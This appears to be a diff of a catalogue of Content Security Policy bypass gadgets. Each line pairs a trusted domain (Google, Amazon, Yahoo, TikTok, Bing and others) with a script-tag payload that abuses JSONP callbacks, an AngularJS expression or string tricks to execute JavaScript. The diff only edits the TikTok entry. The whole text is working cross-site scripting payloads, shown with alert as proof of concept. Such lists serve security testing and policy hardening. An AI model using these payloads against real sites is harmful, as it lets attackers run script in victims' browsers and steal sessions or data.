@@ -3,7 +3,7 @@ aax-eu.amazon.com	<script src="https://aax-eu.amazon.com/e/xsp/getAdj?callback=a
 accounts.google.com	<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
 ads.yap.yahoo.com	<script src="https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?locale=en_us&agentVersion=205&adTrackingEnabled=true&adUnitCode=2e268534-d01b-4616-83cd-709bd90690e1&apiKey=P3VYQ352GKX74CFTRH7X&gdpr=false&euconsent=&publisherUrl=https%3A%2F%2Fwww.autoblog.com&cb=alert();"></script>
 ajax.googleapis.com	<body ng-app ng-csp><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.5/angular.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
-analytics.tiktok.com	<script src="https://analytics.tiktok.com/i18n/pixel/sdk.js?sdkid=BSLBLMOQH7P7CAP6MG40%22-[][`constructor`][`constructor`](`aler`%2b`t(document.domain)`)()-%22"></script>
+analytics.tiktok.com	<script src="https://analytics.tiktok.com/i18n/pixel/sdk.js?sdkid=%22-[][`constructor`][`constructor`](`aler`%2b`t(document.domain)`)()-%22"></script>
 anchor.digitalocean.com	<script src="https://anchor.digitalocean.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>
 ap.lijit.com	<script src="https://ap.lijit.com/rtb/bid?callback=alert&br={%22id%22:%221%22,%22site%22:{%22domain%22:%22x%22,%22page%22:%22x%22}}"></script>
 api.bing.com	<script src="https://api.bing.com/osjson.aspx?query=x&JsonType=callback&JsonCallback=alert"></script>
